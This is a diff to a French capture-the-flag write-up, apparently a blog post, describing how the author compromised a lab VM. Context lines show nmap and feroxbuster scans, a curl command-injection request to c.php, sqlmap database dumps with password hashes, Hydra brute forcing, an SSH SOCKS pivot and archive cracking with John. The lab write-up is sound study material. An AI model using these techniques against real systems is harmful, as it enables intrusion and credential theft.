@@ -49,6 +49,7 @@ Our house, in the middle of our street
 
 HTTP ? Oui.  
 
+{% raw %}
 ```plain
 $ sudo nmap -T5 -p- -sCV 192.168.1.50
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-12-29 12:07 CET
@@ -137,14 +138,19 @@ PORT      STATE SERVICE     VERSION
 |_http-server-header: Apache/2.4.29 (Ubuntu)
 |_http-title: Site doesn't have a title (text/html).
 ```
+{% endraw %}
 
-L'objectif du CTF est de récolter 20 flags, chacun sous la forme *{{tryharder:XXX}}* où *XXX* représente un chiffre. On voit via Nmap que l'on en a déjà récupéré un :)  
+{% raw %}
+L'objectif du CTF est de récolter 20 flags, chacun sous la forme *{{tryharder:XXX}}* où *XXX* représente un chiffre. On voit via Nmap que l'on en a déjà récupéré un :)
+{% endraw %}
 
 Mais soyons bien organisés et agissons dans l'ordre avec le port 25. La page indique *Welcome to the Database Management System* et on trouve un flag dans le code source :  
 
+{% raw %}
 ```html
 <input type="hidden" value="{{tryharder:999}}" />
 ```
+{% endraw %}
 
 Le serveur ne répond pas via un code 404 pour les pages manquantes mais via un code HTTP 200 sans contenu. Heureusement *feroxbuster* a une option pour exclure selon la taille de la réponse.  
 
@@ -173,7 +179,9 @@ by Ben "epi" Risher 🤓                 ver: 2.4.0
 403       11l       32w      300c http://192.168.1.50:25/server-status
 ```
 
+{% raw %}
 La première page retourne *{{tryharder:217}} - There is one more in this directory...* et la seconde *{{tryharder:714}}*.  
+{% endraw %}
 
 Les ports 443, 8008, 8112 et 10000 semblent être en tout points identiques au port 25.  
 
@@ -182,6 +190,7 @@ Our house, was our castle and our keep
 
 Le port 8111 répond avec une référence à l'excellent film *Wargames* :  
 
+{% raw %}
 ```html
 $ curl -D- http://192.168.1.50:8111/
 HTTP/1.1 200 OK
@@ -203,6 +212,7 @@ HOW ABOUT A NICE GAME OF CHESS?<br /><br />
 </body>
 </html>
 ```
+{% endraw %}
 
 On retrouve donc le flag vu précédemment avec Nmap. La bannière du serveur a été modifiée pour contenir le flag, ce dernier apparait donc dans les entêtes HTTP mais aussi dans la signature des pages sur les erreurs 404.  
 
@@ -246,7 +256,9 @@ $ curl -XPOST http://192.168.1.50:8111/c.php --data "command=id"
 <pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-Je n'irais pas plus loin dans cette vulnérabilité car comme dit précédemment je l'ai découverte en dernier et tout le reste était déjà terminé mais dans le même dossier que les scripts se trouvait un fichier *5ac4b37ac5bf324---flag---5ac4b37ac5bf324* contenant le flag *{{tryharder:511}}* et dans le dossier */etc/backup/* se trouvait un fichier *flag.txt* avec le contenu *{{tryharder:1}}*.  
+{% raw %}
+Je n'irais pas plus loin dans cette vulnérabilité car comme dit précédemment je l'ai découverte en dernier et tout le reste était déjà terminé mais dans le même dossier que les scripts se trouvait un fichier *5ac4b37ac5bf324---flag---5ac4b37ac5bf324* contenant le flag *{{tryharder:511}}* et dans le dossier */etc/backup/* se trouvait un fichier *flag.txt* avec le contenu *{{tryharder:1}}*.
+{% endraw %}
 
 Comme vous le verrez par la suite le CTF n'avait pas de cas particuliers d'exploitation (via l'utilisation d'un exploit existant pour une application trouée) et se concentrait sur la nécessité de pivoter avec du password spraying.  
 
@@ -255,11 +267,15 @@ Our house, that was where we used to sleep
 
 Avant d'entrer dans le vif du sujet, petit tour sur le port 20000 qui donne un healthcheck des différents containers sur la machine.  
 
-La page fournit aussi le flag *{{tryharder:1}}* de manière visible et via le code source un second caché :  
+{% raw %}
+La page fournit aussi le flag *{{tryharder:1}}* de manière visible et via le code source un second caché :
+{% endraw %}
 
+{% raw %}
 ```html
 <input type=hidden value="{{tryharder:007}}" />
 ```
+{% endraw %}
 
 Le port 8115 correspond à une installation de [Anchor CMS](http://anchorcms.com/), ce que l'on devine rapidement via la balise méta *generator* du site.  
 
@@ -275,9 +291,11 @@ On s'empresse donc de noter les différents utilisateurs (*larry*, *heather*) da
 
 Concernant la base de données tournant en tant que *root* cette histoire de point d'exclamation ne parraissait un peu gros (si on pouvait exécuter du code sur un serveur MySQL aussi facilement je pense que j'en aurais eu vent). En fait le client MySQL permet bien de faire exécuter des commandes via son invite mais localement, pas sur le serveur :p  
 
-A l'adresse */timeclock/* mentionnée on trouve une mire de login avec une référence *Employee Timeclock Software 0.99* qui semble indiquer qu'on a ici une vrai application web (pas du code maison).  
+À l'adresse */timeclock/* mentionnée on trouve une mire de login avec une référence *Employee Timeclock Software 0.99* qui semble indiquer qu'on a ici une vrai application web (pas du code maison).  
 
-Enfin dans le sous-dossier backup se trouve un flag (*{{tryharder:107}}*) ainsi qu'une archive *all.zip* dont le contenu semble raccord à l'application web.  
+{% raw %}
+Enfin dans le sous-dossier backup se trouve un flag (*{{tryharder:107}}*) ainsi qu'une archive *all.zip* dont le contenu semble raccord à l'application web.
+{% endraw %}
 
 ```plain
 Archive:  all.zip
@@ -347,6 +365,7 @@ back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
 
 Je paste ici les dumps les plus intéressants :  
 
+{% raw %}
 ```plain
 available databases [6]:
 [*] anchor
@@ -390,6 +409,7 @@ Table: anchor_users
 | 4  | {{tryharder:913}} | administrator | larryjr@local.local | active | 2018-10-23 04:19:37 | larryjr  | $2y$12$2jeSR68yBEVqJ88kA16HJ.qgjMy963lXyUY.7AAfKRSCGD1zgK62i | larryjr       |
 +----+-------------------+---------------+---------------------+--------+---------------------+----------+--------------------------------------------------------------+---------------+
 ```
+{% endraw %}
 
 Un flag de plus ! Pour le reste les hashs se cassent rapidement :  
 
@@ -447,6 +467,7 @@ Le mot de passe attendu (hardcodé dans ReverseSSH) est *letmeinbrudipls* et le 
 
 Un nouveau flag s'offre à moi dans le fichier */var/www/html/anchor/config/db.php*.  
 
+{% raw %}
 ```php
 <?php
 
@@ -468,6 +489,7 @@ return [
     ]
 ];
 ```
+{% endraw %}
 
 Le container sur lequel on a atteri a deux interfaces :  
 
@@ -618,8 +640,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra)
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-Pwned ! Dans */root* on trouve le flag *{{tryharder:391}}* et un autre dans la crontab générale :  
+{% raw %}
+Pwned ! Dans */root* on trouve le flag *{{tryharder:391}}* et un autre dans la crontab générale :
+{% endraw %}
 
+{% raw %}
 ```plain
 root@cfbd57786836:~# cat /etc/crontab
 # /etc/crontab: system-wide crontab
@@ -639,6 +664,7 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 #
 5/* * * * *     root    logger "{{tryharder:301}}" &> /dev/null
 ```
+{% endraw %}
 
 Cette machine a accès à un réseau supplémentaire :  
 
@@ -702,7 +728,7 @@ Host script results:
 |_    Message signing enabled but not required
 ```
 
-C'est là où ça devient un poil plus tricky. Grace à notre accès SSH sur la seconde machine (forwardé sur le port 2424 local) on va créer un serveur proxy SOCKS via SSH qui permettra d'atteindre les machines de ce réseau (et surtout le serveur Samba).  
+C'est là où ça devient un poil plus tricky. Grâce à notre accès SSH sur la seconde machine (forwardé sur le port 2424 local) on va créer un serveur proxy SOCKS via SSH qui permettra d'atteindre les machines de ce réseau (et surtout le serveur Samba).  
 
 ```plain
 $ ssh -D 1080 -N -p 2424 root@127.0.0.1
@@ -765,9 +791,11 @@ smb: \> get Flag.txt
 getting file \Flag.txt of size 18 as Flag.txt (0,8 KiloBytes/sec) (average 0,8 KiloBytes/sec)
 ```
 
-Ca passe avec *larryjr* / *larryjr*... On est en 2022 et aucun des outils de bruteforce n'est capable de casser du SMB, ça promet (il manque Metasploit que je n'ai pas testé).  
+Ça passe avec *larryjr* / *larryjr*... On est en 2022 et aucun des outils de bruteforce n'est capable de casser du SMB, ça promet (il manque Metasploit que je n'ai pas testé).  
 
+{% raw %}
 Le flag obtenu est *{{tryharder:1337}}*
+{% endraw %}
 
 Sur le partage *companyInfo* on a trois fichiers :  
 
@@ -777,14 +805,19 @@ Sur le partage *companyInfo* on a trois fichiers :
   hint.txt                            A       93  Sun Oct 28 22:03:08 2018
 ```
 
+{% raw %}
 Un flag (*{{tryharder:2020}}*) et une notice explicative :  
+{% endraw %}
 
+{% raw %}
 > The password is like {{tryharder:xx}} where xx are two numbers...  
 > 
 > The password is the flag!!
+> {% endraw %}
 
 Comme on s'en doutait l'archive 7z restante est protégée par mot de passe. J'utilise l'utilitaire 7z2john puis je casse en générant les mots de passe possibles à la volée :  
 
+{% raw %}
 ```plain
 $ python3 -c 'for i in range(100): print("{{tryharder:" + str(i) + "}}")' | ./john --stdin /tmp/hash.txt 
 Using default input encoding: UTF-8
@@ -800,6 +833,7 @@ Press Ctrl-C to abort, or send SIGUSR1 to john process for status
 Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
+{% endraw %}
 
 We would have such a very good time
 -----------------------------------
@@ -857,9 +891,11 @@ Ngrep voit la requête POST générée par Wapiti mais n'a pas vu le flag dans l
 
 Si on se rend sur la page de login administrateur du CMS on retrouve bien le flag :  
 
+{% raw %}
 ```html
 <input name="flag" type="hidden" value="{{tryharder:104}}">
 ```
+{% endraw %}
 
 Pour information juste lancer un scan de port Nmap avec Ngrep en parallèle remonte 4 flags différents :)  
 
